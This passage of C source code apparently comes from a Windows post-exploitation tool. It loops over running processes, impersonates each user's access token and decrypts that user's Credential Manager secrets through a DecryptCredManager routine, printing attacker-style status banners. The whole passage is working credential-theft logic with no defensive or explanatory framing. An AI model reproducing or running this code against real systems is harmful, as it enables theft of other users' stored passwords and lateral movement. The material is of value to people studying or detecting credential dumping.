				Impersonated[dwLastSid].SID = CurrentSID;
				Impersonated[dwLastSid].SidSize = strlen(CurrentSID);

				dwLastSid += 1;

				//Check if allready Impersonated

				cbUserName = UNLEN;
				cbDomainName = DNLEN;
				
				if (!pLookupAccountSidA(NULL, pToken->User.Sid, lpUser, &cbUserName, lpDomainName, &cbDomainName, &snu)) {
					Status = GetLastError();
					break;
				}

				print_("#####################\n", 0);

				print_("[+] Impersonated: ", 0);
				print_(lpDomainName, cbDomainName);
				print_("\\", 1);
				print_(lpUser, cbUserName);
				print_("\n\n", 2);

				MemFree(pToken); pToken = NULL;

				Status = DecryptCredManager(hUserToken, lpCredsPath);
				if (Status != ERROR_SUCCESS) {

					if (Status == ERROR_NOT_FOUND) {
						dwChars = wsprintfA(lpErrorMessage, "%s0x%X (%s)\n", "[-] Error: ", Status, "No credentials found");
						print_(lpErrorMessage, dwChars);
					}
					else
						PrintError("[-] Error: ", Status);

					Status = ERROR_SUCCESS;
				}

				print_("#####################\n\n", 0);

			} while (FALSE);

			if (hProc)
				NtClose(hProc);

			if (hUserToken)
				NtClose(hUserToken);

			if (pToken)
				MemFree(pToken);

			pProcesses = (PSYSTEM_PROCESS_INFORMATION)((DWORD_PTR)pProcesses + (DWORD_PTR)pProcesses->NextEntryOffset);
		}

	} while (FALSE);

	if (bRevert) {
		hSetToken = NULL;
		NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hSetToken, sizeof(HANDLE));
	}

	if (Impersonated) {

		for (i = 0; i < dwLastSid; i++) {
			if (Impersonated[i].SID)
				LocalFree(Impersonated[i].SID);
		}

		MemFree(Impersonated);
	}

	if (lpSystemRoot)
		MemFree(lpSystemRoot);

	if (ProcBackup)
		MemFree(ProcBackup);

	if (hToken)
		NtClose(hToken);

	if (Status != ERROR_SUCCESS)
		PrintError("[-] Error: ", Status);
	
	if (hFile)
		NtClose(hFile);

}
